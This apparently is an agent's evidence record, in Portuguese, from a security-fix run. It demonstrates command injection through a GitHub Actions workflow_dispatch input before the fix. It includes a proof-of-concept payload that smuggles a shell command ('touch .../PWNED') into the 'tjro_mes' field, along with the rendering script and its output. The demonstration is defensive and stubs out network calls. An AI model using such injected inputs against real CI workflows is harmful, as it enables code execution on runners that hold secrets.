---
type: AgentEvidence
id: "2026-09-24-exciting-mccarthy-1c8jcc-evidence-red-workflow-injection-demo"
run_id: "2026-09-24-exciting-mccarthy-1c8jcc"
kind: "runtime"
reference: ".github/workflows/tjro-sync.yml (step 'Crawl JURIS', HEAD 6e72fab, antes desta rodada mudar o arquivo)"
summary: "Demonstracao ao vivo, antes de qualquer mudanca de producao: extraido o texto real do step 'Crawl JURIS' via yaml.safe_load, simulada a substituicao textual literal que o GitHub Actions faz para ${{ inputs.tjro_mes }} (exatamente como o runtime faz, antes do bash processar o script) usando um payload malicioso de dispatch ('2024-01\"; touch /tmp/claude-0/PWNED; echo \"'), e executado o script resultante via bash com um stub de 'uv' no PATH (para nao chamar a rede/IA de verdade). O comando injetado ('touch /tmp/.../PWNED') executou de fato, exit code 0, confirmando execucao arbitraria de comando no runner secret-bearing (IA_ACCESS_KEY/IA_SECRET_KEY/RELAY_TOKEN no ambiente do job) a partir de um input de workflow_dispatch nao confiavel -- exatamente o invariante que TM-01/#1608 descreve como violado. Confirma que a vulnerabilidade acontece na propria substituicao ${{ }} do GitHub Actions (antes do 'eval' citado no titulo da issue rodar), o que motivou a decisao de corrigir tambem a interpolacao direta nos outros 5 workflows com o mesmo padrao, nao so remover o 'eval'."
---

# Evidencia: exploracao ao vivo da injecao via workflow_dispatch (pre-fix)

```
$ python3 - <<'PY'
import yaml, pathlib
wf = yaml.safe_load(pathlib.Path(".github/workflows/tjro-sync.yml").read_text())
step = next(s for s in wf["jobs"]["tjro"]["steps"] if s.get("name") == "Crawl JURIS")
script = step["run"]
malicious_tjro_mes = '2024-01"; touch /tmp/claude-0/PWNED; echo "'
rendered = (script
    .replace("${{ inputs.tjro_ano }}", "")
    .replace("${{ inputs.tjro_mes }}", malicious_tjro_mes)
    .replace("${{ inputs.tjro_desde_ano }}", "")
    .replace("${{ inputs.tjro_tipos }}", "")
    .replace("${{ github.event_name }}", "workflow_dispatch"))
pathlib.Path("rendered_malicious.sh").write_text(rendered)
PY

$ rm -f /tmp/claude-0/PWNED
$ PATH="$PWD/fakebin:$PATH" bash rendered_malicious.sh
Running: uv run --no-dev tjro-juris crawl data/tjro-juris --mes 2024-01
uv called with: run --no-dev tjro-juris crawl data/tjro-juris --mes 2024-01
---exit:0---

$ ls -la /tmp/claude-0/PWNED
-rw-r--r-- 1 root root 0 Sep 24 21:27 /tmp/claude-0/PWNED
VULNERABLE: arbitrary command executed via workflow_dispatch input
```

O arquivo `PWNED` foi criado por um comando de shell (`touch`)
embutido no valor de `tjro_mes`, um input `workflow_dispatch` que um
colaborador com permissao de dispatch controla diretamente. O `uv`
real foi substituido por um stub (`fakebin/uv`, so ecoa `argv`) para
que a demonstracao nao dependesse de rede/credenciais reais -- o ponto
provado e a execucao do comando injetado antes mesmo de `uv` ser
chamado, nao o comportamento do `tjro-juris` em si.
